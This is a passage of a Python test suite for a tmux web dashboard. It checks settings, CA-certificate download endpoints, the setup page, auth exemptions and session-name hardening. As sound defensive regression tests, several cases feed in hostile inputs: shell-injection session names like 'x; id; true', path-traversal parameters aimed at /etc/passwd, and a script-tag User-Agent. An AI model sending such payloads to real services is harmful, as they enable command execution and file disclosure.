    client, tmp_path, monkeypatch
):
    """expected_settings_updated_at never leaks into the persisted/response settings."""
    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    current_ts = client.get("/api/settings").json()["settings_updated_at"]
    response = client.patch(
        "/api/settings",
        json={
            "sort_order": "alphabetical",
            "expected_settings_updated_at": current_ts,
        },
    )
    assert response.status_code == 200
    assert "expected_settings_updated_at" not in response.json()

    import json as json_mod

    on_disk = json_mod.loads(settings_path.read_text())
    assert "expected_settings_updated_at" not in on_disk


# ---------------------------------------------------------------------------
# GET /api/instance-info
# ---------------------------------------------------------------------------


def test_instance_info_returns_200(client):
    """GET /api/instance-info returns 200 with name and version keys."""
    response = client.get("/api/instance-info")
    assert response.status_code == 200
    assert "name" in response.json()


def test_instance_info_returns_name_and_version(client, tmp_path, monkeypatch):
    """GET /api/instance-info returns name='test-host' and a non-empty version string when hostname is mocked."""
    import socket

    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    monkeypatch.setattr(socket, "gethostname", lambda: "test-host")

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    data = response.json()
    assert data["name"] == "test-host"
    assert "version" in data and isinstance(data["version"], str) and data["version"]


def test_instance_info_uses_explicit_device_name(client, tmp_path, monkeypatch):
    """GET /api/instance-info uses explicit device_name from settings when set."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"device_name": "My Workstation"}))

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    data = response.json()
    assert data["name"] == "My Workstation"
    assert "version" in data and isinstance(data["version"], str) and data["version"]


def test_instance_info_includes_server_started_at(client, monkeypatch):
    """GET /api/instance-info must report server_started_at as the process's
    own _server_start_time -- the watermark half of the created_at
    comparison (BACKLOG.md #7 / docs/API_SEMANTICS.md)."""
    import muxplex.main as main_mod

    monkeypatch.setattr(main_mod, "_server_start_time", 1690000000.0)

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    data = response.json()
    assert data["server_started_at"] == 1690000000.0


def test_instance_info_no_auth_required(tmp_path, monkeypatch):
    """GET /api/instance-info returns 200 even without an auth cookie."""
    import muxplex.settings as settings_mod

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    with TestClient(app) as c:
        # No auth cookie set — endpoint must be accessible without one
        response = c.get("/api/instance-info")
    assert response.status_code == 200
    data = response.json()
    assert "name" in data
    assert "version" in data


def test_instance_info_includes_federation_enabled(client, tmp_path, monkeypatch):
    """GET /api/instance-info includes federation_enabled=False when no key file exists."""
    import muxplex.settings as settings_mod

    # Redirect settings path so defaults are used
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    # Redirect federation key path to a nonexistent file
    monkeypatch.setattr(
        settings_mod, "FEDERATION_KEY_PATH", tmp_path / "nonexistent_federation_key"
    )

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    data = response.json()
    assert "federation_enabled" in data, (
        f"Response must include 'federation_enabled' key, got: {data}"
    )
    assert data["federation_enabled"] is False, (
        f"federation_enabled must be False when no key file exists, got: {data['federation_enabled']}"
    )


def test_instance_info_federation_enabled_true_when_key_exists(
    client, tmp_path, monkeypatch
):
    """GET /api/instance-info returns federation_enabled=True when a key file is present."""
    import muxplex.settings as settings_mod

    # Write a federation key file to tmp_path
    key_file = tmp_path / "federation_key"
    key_file.write_text("test-federation-secret")

    # Redirect settings path so defaults are used
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    # Redirect federation key path to the file we just wrote
    monkeypatch.setattr(settings_mod, "FEDERATION_KEY_PATH", key_file)

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    data = response.json()
    assert "federation_enabled" in data, (
        f"Response must include 'federation_enabled' key, got: {data}"
    )
    assert data["federation_enabled"] is True, (
        f"federation_enabled must be True when a key file exists, got: {data['federation_enabled']}"
    )


def test_instance_info_includes_tmux_socket_dir_configured(
    client, tmp_path, monkeypatch
):
    """GET /api/instance-info returns the configured tmux_socket_dir value verbatim."""
    import json as json_mod

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json_mod.dumps({"tmux_socket_dir": "/custom/tmux/socket/dir"})
    )

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    assert response.json()["tmux_socket_dir"] == "/custom/tmux/socket/dir"


def test_instance_info_tmux_socket_dir_falls_back_when_unset(
    client, tmp_path, monkeypatch
):
    """With tmux_socket_dir unset, instance-info still returns a non-empty resolved path."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    monkeypatch.delenv("TMUX_TMPDIR", raising=False)

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    assert response.json()["tmux_socket_dir"]  # non-empty fallback, never ""


def test_instance_info_includes_device_id(client, tmp_path, monkeypatch):
    """GET /api/instance-info includes device_id as a non-empty string."""
    import muxplex.identity as identity_mod
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    monkeypatch.setattr(identity_mod, "IDENTITY_PATH", tmp_path / "identity.json")

    response = client.get("/api/instance-info")
    assert response.status_code == 200
    data = response.json()
    assert "device_id" in data, f"Response must include 'device_id' key, got: {data}"
    assert isinstance(data["device_id"], str), (
        f"device_id must be a string, got: {type(data['device_id'])}"
    )
    assert data["device_id"] != "", (
        f"device_id must be a non-empty string, got: {data['device_id']!r}"
    )


# ---------------------------------------------------------------------------
# GET /api/ca
# ---------------------------------------------------------------------------


def test_ca_endpoint_returns_pem_when_ca_present(client, tmp_path, monkeypatch):
    """GET /api/ca returns 200, the CA PEM, correct content-type, never a private key."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    response = client.get("/api/ca")
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("application/x-pem-file")
    body = response.content
    assert b"BEGIN CERTIFICATE" in body, (
        f"Response body must contain a PEM certificate, got: {body[:80]!r}"
    )
    assert b"PRIVATE KEY" not in body, (
        "Response must NEVER include private key material"
    )


def test_ca_endpoint_404_when_no_ca_configured(client, tmp_path, monkeypatch):
    """GET /api/ca returns 404 with a helpful detail when no local CA exists."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.get("/api/ca")
    assert response.status_code == 404
    detail = response.json().get("detail", "")
    assert detail, "404 response must include a non-empty, helpful 'detail' message"


def test_ca_endpoint_no_auth_required(tmp_path, monkeypatch):
    """GET /api/ca returns 200 even without an auth cookie/credentials."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    with TestClient(app) as c:
        # No auth cookie set — endpoint must be accessible without one.
        response = c.get("/api/ca")
    assert response.status_code == 200
    assert b"BEGIN CERTIFICATE" in response.content


def test_ca_endpoint_404_for_leaf_not_ca(client, tmp_path, monkeypatch):
    """GET /api/ca returns 404 (never serves the file) when a non-CA leaf cert sits at the CA path."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_self_signed

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_dir = tmp_path / "ca"
    ca_dir.mkdir(parents=True)
    # A plain self-signed leaf has no BasicConstraints CA:TRUE — wrong content
    # accidentally left at the CA path.
    leaf_cert_path = ca_dir / "muxplex-ca.crt"
    leaf_key_path = ca_dir / "leaf-only.key"
    generate_self_signed(leaf_cert_path, leaf_key_path)

    response = client.get("/api/ca")
    assert response.status_code == 404


def test_ca_endpoint_ignores_query_params(client, tmp_path, monkeypatch):
    """No query parameter can redirect the read — the endpoint takes no request input at all."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)
    expected_body = ca_cert_path.read_bytes()

    # Attempted path-traversal / arbitrary-file-read style query params must
    # be silently ignored — same CA is served regardless.
    response = client.get(
        "/api/ca", params={"path": "/etc/passwd", "file": "../../../etc/passwd"}
    )
    assert response.status_code == 200
    assert response.content == expected_body


def test_ca_endpoint_handler_accepts_no_parameters():
    """The handler itself takes no parameters — the structural guarantee that
    no request input (path/query/body/header) can reach the filesystem read."""
    import inspect

    from muxplex.main import get_ca_certificate

    sig = inspect.signature(get_ca_certificate)
    assert len(sig.parameters) == 0, (
        f"get_ca_certificate must take zero parameters, got: {list(sig.parameters)}"
    )


# ---------------------------------------------------------------------------
# GET /ca.crt (Android-cert-MIME variant of /api/ca)
# ---------------------------------------------------------------------------


def test_ca_crt_returns_same_bytes_as_api_ca_with_android_mime(
    client, tmp_path, monkeypatch
):
    """GET /ca.crt serves byte-identical content to /api/ca, but with the
    MIME type (application/x-x509-ca-cert) Android's DownloadManager
    recognizes to route straight into the system cert installer."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    api_response = client.get("/api/ca")
    crt_response = client.get("/ca.crt")

    assert crt_response.status_code == 200
    assert crt_response.headers["content-type"].startswith("application/x-x509-ca-cert")
    assert crt_response.content == api_response.content
    assert b"BEGIN CERTIFICATE" in crt_response.content
    assert b"PRIVATE KEY" not in crt_response.content


def test_ca_crt_404_when_no_ca_configured(client, tmp_path, monkeypatch):
    """GET /ca.crt returns 404 with a helpful detail when no local CA exists."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.get("/ca.crt")
    assert response.status_code == 404
    detail = response.json().get("detail", "")
    assert detail, "404 response must include a non-empty, helpful 'detail' message"


def test_ca_crt_no_auth_required(tmp_path, monkeypatch):
    """GET /ca.crt returns 200 even without an auth cookie/credentials."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    with TestClient(app) as c:
        response = c.get("/ca.crt")
    assert response.status_code == 200
    assert b"BEGIN CERTIFICATE" in response.content


def test_ca_crt_handler_accepts_no_parameters():
    """Same structural guarantee as /api/ca: no request input can reach the
    filesystem read (no path/query/body/header parameter exists to abuse)."""
    import inspect

    from muxplex.main import get_ca_certificate_for_install

    sig = inspect.signature(get_ca_certificate_for_install)
    assert len(sig.parameters) == 0, (
        "get_ca_certificate_for_install must take zero parameters, got: "
        f"{list(sig.parameters)}"
    )


def test_ca_crt_ignores_query_params(client, tmp_path, monkeypatch):
    """No query parameter can redirect the read on /ca.crt either."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)
    expected_body = ca_cert_path.read_bytes()

    response = client.get(
        "/ca.crt", params={"path": "/etc/passwd", "file": "../../../etc/passwd"}
    )
    assert response.status_code == 200
    assert response.content == expected_body


def test_ca_private_key_never_served_by_any_route(client, tmp_path, monkeypatch):
    """Security regression guard: the CA private key must never be reachable
    over HTTP by any route this feature introduces, however it's requested."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)
    private_key_bytes = ca_key_path.read_bytes()
    assert b"PRIVATE KEY" in private_key_bytes  # sanity: the fixture is real

    # Every route this feature adds/touches, plus traversal attempts against
    # each, must never return the private key material.
    candidates = [
        "/api/ca",
        "/ca.crt",
        "/setup",
        "/ca.key",  # a plausible-but-nonexistent sibling path
        "/api/ca/../ca.key",
    ]
    for path in candidates:
        response = client.get(path)
        assert b"PRIVATE KEY" not in response.content, (
            f"{path} must never serve private key material, got: "
            f"{response.content[:200]!r}"
        )


# ---------------------------------------------------------------------------
# GET /setup
# ---------------------------------------------------------------------------


def test_setup_page_returns_200_with_download_link(client, tmp_path, monkeypatch):
    """GET /setup renders 200 HTML with a link to the CA download."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    response = client.get("/setup")
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/html")
    assert "/ca.crt" in response.text
    assert "PRIVATE KEY" not in response.text


def test_setup_page_no_auth_required(tmp_path, monkeypatch):
    """GET /setup returns 200 without any auth cookie/credentials -- a user
    who hasn't installed the CA yet cannot hold a valid session."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    with TestClient(app) as c:
        response = c.get("/setup")
    assert response.status_code == 200


def test_setup_page_no_ca_configured_says_so_plainly(client, tmp_path, monkeypatch):
    """When no local CA is configured, /setup must return 200 with a plain
    explanation -- never 404, never an empty/broken page."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.get("/setup")
    assert response.status_code == 200
    assert "not configured" in response.text.lower() or "no local ca" in (
        response.text.lower()
    )
    # No download link should be offered when there's nothing to download.
    assert 'href="/ca.crt"' not in response.text


@pytest.mark.parametrize(
    ("user_agent", "expected_open_platform"),
    [
        (
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
            "android",
        ),
        (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "ios",
        ),
        (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "macos",
        ),
        (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "windows",
        ),
    ],
)
def test_setup_page_opens_detected_platform_section(
    client, tmp_path, monkeypatch, user_agent, expected_open_platform
):
    """The detected platform's <details> block is open by default; the
    other three remain present (collapsed) so a user can pick a different
    device."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    response = client.get("/setup", headers={"User-Agent": user_agent})
    assert response.status_code == 200
    html = response.text

    all_platforms = ("android", "ios", "macos", "windows")
    for platform in all_platforms:
        assert f'data-platform="{platform}"' in html, (
            f"Expected a {platform} instructions block to always be present"
        )

    assert f'data-platform="{expected_open_platform}" open' in html
    for other in all_platforms:
        if other != expected_open_platform:
            assert f'data-platform="{other}" open' not in html


def test_setup_page_never_echoes_raw_user_agent(client, tmp_path, monkeypatch):
    """A hostile/unusual User-Agent header must never be reflected verbatim
    into the page -- detect_platform maps it to a closed-set label first."""
    import muxplex.settings as settings_mod
    from muxplex.tls import generate_local_ca

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    ca_cert_path = tmp_path / "ca" / "muxplex-ca.crt"
    ca_key_path = tmp_path / "ca" / "muxplex-ca.key"
    generate_local_ca(ca_cert_path, ca_key_path)

    hostile_ua = "<script>alert(1)</script>-Android-marker-zzqq"
    response = client.get("/setup", headers={"User-Agent": hostile_ua})
    assert response.status_code == 200
    assert "<script>alert(1)</script>" not in response.text
    assert "zzqq" not in response.text


# ---------------------------------------------------------------------------
# Auth exemption did not widen beyond the two new paths
# ---------------------------------------------------------------------------


def test_auth_exempt_paths_only_gained_ca_crt_and_setup():
    """Regression guard: adding /ca.crt and /setup must not have widened the
    exemption list for anything else. Fails loudly (with a diff-friendly
    message) if the set doesn't match exactly what this feature intended."""
    from muxplex.auth import _AUTH_EXEMPT_PATHS

    expected = {
        "/login",
        "/auth/mode",
        "/auth/logout",
        "/api/instance-info",
        "/api/ca",
        "/ca.crt",
        "/setup",
    }
    assert _AUTH_EXEMPT_PATHS == expected, (
        f"_AUTH_EXEMPT_PATHS changed unexpectedly. "
        f"Added: {_AUTH_EXEMPT_PATHS - expected}, "
        f"removed: {expected - _AUTH_EXEMPT_PATHS}"
    )


def test_unrelated_protected_route_still_requires_auth(tmp_path, monkeypatch):
    """Sanity check that the exemption is scoped: an ordinary API route is
    still gated by auth after this change (non-localhost, no cookie)."""
    import muxplex.settings as settings_mod

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    with TestClient(app) as c:
        response = c.get("/api/sessions", follow_redirects=False)
    assert response.status_code in (302, 303, 307, 401, 403), (
        f"Expected /api/sessions to require auth, got {response.status_code}"
    )


# ---------------------------------------------------------------------------
# POST /api/sessions (create new session)
# ---------------------------------------------------------------------------


def test_create_session_returns_200_with_name(client, monkeypatch):
    """POST /api/sessions with valid name returns 200 with {name: name}."""
    from unittest.mock import AsyncMock, MagicMock

    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0

    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_shell",
        AsyncMock(return_value=mock_proc),
    )

    response = client.post("/api/sessions", json={"name": "my-project"})
    assert response.status_code == 200
    data = response.json()
    assert data["name"] == "my-project"


def test_create_session_substitutes_name_in_template(client, tmp_path, monkeypatch):
    """POST /api/sessions substitutes {name} with actual name in new_session_template."""
    import json
    from unittest.mock import AsyncMock, MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"new_session_template": "echo {name}"}))

    shell_calls = []

    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0

    async def mock_create_subprocess(cmd, **kwargs):
        shell_calls.append(cmd)
        return mock_proc

    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_shell", mock_create_subprocess
    )

    response = client.post("/api/sessions", json={"name": "my-project"})
    assert response.status_code == 200
    assert len(shell_calls) == 1
    assert shell_calls[0] == "echo my-project"


def test_create_session_rejects_empty_name(client):
    """POST /api/sessions with empty name returns 422."""
    response = client.post("/api/sessions", json={"name": ""})
    assert response.status_code == 422


def test_create_session_rejects_missing_name(client):
    """POST /api/sessions with missing name returns 422."""
    response = client.post("/api/sessions", json={})
    assert response.status_code == 422


# ---------------------------------------------------------------------------
# DELETE /api/sessions/{name}
# ---------------------------------------------------------------------------


def test_delete_session_success(client, monkeypatch):
    """DELETE /api/sessions/{name} returns 200 with {ok: True, name: name} when session exists."""
    from unittest.mock import AsyncMock

    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["my-session", "other"]
    )
    monkeypatch.setattr("muxplex.main.run_tmux", AsyncMock(return_value=""))

    response = client.delete("/api/sessions/my-session")
    assert response.status_code == 200
    data = response.json()
    assert data["ok"] is True
    assert data["name"] == "my-session"


def test_delete_session_calls_kill_session(client, monkeypatch, tmp_path):
    """DELETE /api/sessions/{name} runs 'tmux kill-session -t {name}' via subprocess (default template)."""
    from unittest.mock import MagicMock, patch

    import muxplex.settings as settings_mod

    # Redirect settings to a non-existent path so the default template is used
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "no-settings.json")

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["my-session"])

    captured = []

    def mock_run(cmd, **kwargs):
        captured.append(cmd)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        client.delete("/api/sessions/my-session")

    assert len(captured) == 1, "subprocess.run must be called exactly once"
    executed_cmd = captured[0]
    assert "kill-session" in executed_cmd, (
        f"Default command must include 'kill-session', got: {executed_cmd!r}"
    )
    assert "-t" in executed_cmd, (
        f"Default command must include '-t', got: {executed_cmd!r}"
    )
    assert "my-session" in executed_cmd, (
        f"Command must include session name 'my-session', got: {executed_cmd!r}"
    )


def test_delete_session_not_found(client, monkeypatch):
    """DELETE /api/sessions/{name} returns 404 when session is not in list."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])

    response = client.delete("/api/sessions/nonexistent")
    assert response.status_code == 404


def test_delete_session_requires_auth_for_asset_like_name(monkeypatch):
    """Regression: an unauthenticated, non-localhost DELETE for a session
    name that looks like a static asset (e.g. "probe.js") must be blocked
    by AuthMiddleware (401), not reach this endpoint's own 404.

    Same incident as the GET regression above, destructive-endpoint side:
    before the fix, this exact unauthenticated request reached
    `delete_session` and returned its OWN 404 instead of AuthMiddleware's
    401. Uses its own unauthenticated client rather than the `client`
    fixture (which pre-injects a valid session cookie).
    """
    monkeypatch.setattr("muxplex.main.get_session_list", list)

    with TestClient(app, base_url="http://192.168.1.1", follow_redirects=False) as c:
        for name in ("probe.js", "data.json", "site.map", "style.css"):
            response = c.delete(
                f"/api/sessions/{name}", headers={"Accept": "application/json"}
            )
            assert response.status_code == 401, (
                f"DELETE /api/sessions/{name} should require auth, got "
                f"{response.status_code}: {response.text}"
            )


def test_real_static_assets_still_unauthenticated_after_fix(monkeypatch):
    """The OTHER direction of the incident fix: real static assets (the
    login page's own CSS/JS) must remain servable to an unauthenticated,
    non-localhost client -- scoping the exemption to real files must not
    lock every user out of the web UI. Exercises the actual frontend
    directory (no monkeypatching of `_FRONTEND_DIR`), unlike the unit-level
    tests in test_auth.py."""
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-pw")
    with TestClient(app, base_url="http://192.168.1.1", follow_redirects=False) as c:
        for path in ("/app.js", "/style.css", "/terminal.js"):
            response = c.get(path)
            assert response.status_code == 200, f"GET {path} -> {response.status_code}"


# ---------------------------------------------------------------------------
# Security: session-name allowlist, fail-closed gate, injection defense
#
# Regression guards for the live remote-code-execution hardening:
#   1. create/delete substituted a client-supplied name into a shell command
#      with only a .strip() -- `name="x; touch FILE; true"` executed FILE.
#   2. delete had no name validator at all (the wider hole).
#   3. the known-session gate (`if known and name not in known`) failed OPEN
#      whenever the session cache was empty -- the guard evaporated exactly
#      when the system was least healthy.
# ---------------------------------------------------------------------------


def test_create_session_rejects_shell_injection(client, monkeypatch):
    """POST /api/sessions rejects an injection payload with 400 and never spawns."""
    from unittest.mock import AsyncMock

    spawned = AsyncMock()
    monkeypatch.setattr("tmux_kit.spawn.asyncio.create_subprocess_shell", spawned)

    response = client.post(
        "/api/sessions", json={"name": "x; touch /tmp/deckdev-should-not-exist; true"}
    )

    assert response.status_code == 400
    assert spawned.call_count == 0, (
        "create_subprocess_shell must NOT run when the name fails the allowlist"
    )


def test_delete_session_rejects_shell_injection(client, monkeypatch):
    """DELETE /api/sessions/{name} rejects an injection payload with 400 and never runs."""
    from unittest.mock import MagicMock, patch

    # A populated cache proves the 400 is the allowlist, not the fail-closed gate.
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])
    run = MagicMock()

    # Note: DELETE takes the name as a path segment, so `/` can't appear here --
    # the injection surface is the remaining shell metacharacters (`;`, spaces).
    with patch("muxplex.main.subprocess.run", run):
        response = client.delete("/api/sessions/x;%20id;%20true")

    assert response.status_code == 400
    assert run.call_count == 0, (
        "subprocess.run must NOT run when the name fails the allowlist"
    )


def test_create_session_rejects_invalid_charset(client, monkeypatch):
    """POST /api/sessions rejects names with spaces/metacharacters (400), not a subprocess."""
    from unittest.mock import AsyncMock

    spawned = AsyncMock()
    monkeypatch.setattr("tmux_kit.spawn.asyncio.create_subprocess_shell", spawned)

    for bad in ["has space", "back`tick`", "pipe|it", "dollar$ign", "a" * 65, "co:lon"]:
        response = client.post("/api/sessions", json={"name": bad})
        assert response.status_code == 400, f"expected 400 for {bad!r}"
    assert spawned.call_count == 0


def test_create_and_delete_accept_ordinary_names(client, monkeypatch, tmp_path):
    """Valid names (letters/digits/_.-) still create and delete normally."""
    import json
    from unittest.mock import AsyncMock, MagicMock, patch

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"new_session_template": "echo {name}"}))

    proc = MagicMock()
    proc.communicate = AsyncMock(return_value=(b"", b""))
    proc.returncode = 0
    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_shell",
        AsyncMock(return_value=proc),
    )

    # Representative of real live session names (dots, underscores, hyphens).
    for name in ["amplifier-wiki", "a2a", "my_project.v2", "AAA-claw"]:
        resp = client.post("/api/sessions", json={"name": name})
        assert resp.status_code == 200, f"valid name {name!r} must be accepted"

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["amplifier-wiki"])
    run_result = MagicMock()
    run_result.returncode = 0
    run_result.stderr = ""
    with patch("muxplex.main.subprocess.run", return_value=run_result):
        resp = client.delete("/api/sessions/amplifier-wiki")
    assert resp.status_code == 200


def test_delete_session_fails_closed_on_empty_cache(client, monkeypatch):
    """DELETE rejects (404) when the session cache is empty -- never allow-through."""
    from unittest.mock import MagicMock, patch

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    run = MagicMock()

    with patch("muxplex.main.subprocess.run", run):
        response = client.delete("/api/sessions/alpha")

    assert response.status_code == 404, (
        "empty cache must fail closed, not allow the delete through"
    )
    assert run.call_count == 0, "no subprocess may run when the target is unknown"


def test_connect_session_fails_closed_on_empty_cache(client, monkeypatch):
    """POST connect rejects (404) when the session cache is empty -- never allow-through."""

    async def _fail_ensure(name):
        raise AssertionError("ensure_ttyd must not run when target is unknown")

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.ensure_ttyd", _fail_ensure)

    response = client.post("/api/sessions/alpha/connect")
    assert response.status_code == 404


def test_delete_session_exact_match_not_prefix(client, monkeypatch):
    """DELETE 'foo' with only 'foobar' known must 404 (no tmux -t prefix match)."""
    from unittest.mock import MagicMock, patch

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["foobar"])
    run = MagicMock()

    with patch("muxplex.main.subprocess.run", run):
        response = client.delete("/api/sessions/foo")

    assert response.status_code == 404
    assert run.call_count == 0


def test_connect_session_exact_match_not_prefix(client, monkeypatch):
    """POST connect 'foo' with only 'foobar' known must 404 (exact membership)."""

    async def _fail_ensure(name):
        raise AssertionError("ensure_ttyd must not run for a prefix-only match")

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["foobar"])
    monkeypatch.setattr("muxplex.main.ensure_ttyd", _fail_ensure)

    response = client.post("/api/sessions/foo/connect")
    assert response.status_code == 404


def test_delete_session_shlex_quote_defense_in_depth(client, monkeypatch, tmp_path):
    """If the allowlist is ever loosened, shlex.quote() still neutralizes the name.

    Simulates a regressed allowlist by forcing is_valid_session_name True, then
    proves the substituted name is shlex-quoted (metacharacters inert) in the
    shell command that would run.
    """
    import shlex
    from unittest.mock import MagicMock, patch

    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "no-settings.json")
    monkeypatch.setattr("muxplex.main.is_valid_session_name", lambda name: True)

    # No `/` -- the name is a DELETE path segment. `;` and spaces are the shell
    # metacharacters we prove shlex.quote() neutralizes.
    payload = "x; id; true"
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: [payload])

    captured = []

    def mock_run(cmd, **kwargs):
        captured.append(cmd)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        client.delete(f"/api/sessions/{payload}")

